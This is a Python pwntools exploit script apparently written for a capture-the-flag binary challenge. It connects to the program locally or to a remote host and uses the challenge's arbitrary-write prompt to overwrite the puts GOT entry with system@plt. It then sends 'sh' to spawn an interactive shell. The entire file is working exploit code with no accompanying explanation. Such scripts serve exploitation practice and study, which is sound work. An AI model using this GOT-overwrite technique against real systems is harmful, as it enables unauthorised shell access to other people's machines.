#!/usr/bin/env python3
from pwn import *
import sys

FILENAME = "./src/chal"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)

if len(sys.argv) == 1:
    r = process(FILENAME)
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

puts_got = exe.got["puts"]
system_plt = exe.plt["system"]

log.info("puts@got: " + hex(puts_got))
log.info("system@plt: " + hex(system_plt))

r.recvuntil(b"Address to write: ")
r.sendline(hex(puts_got).encode())
r.recvuntil(b"Value to write: ")
r.sendline(hex(system_plt).encode())
r.recvuntil(b"echo> ")
r.sendline(b"sh")

r.interactive()
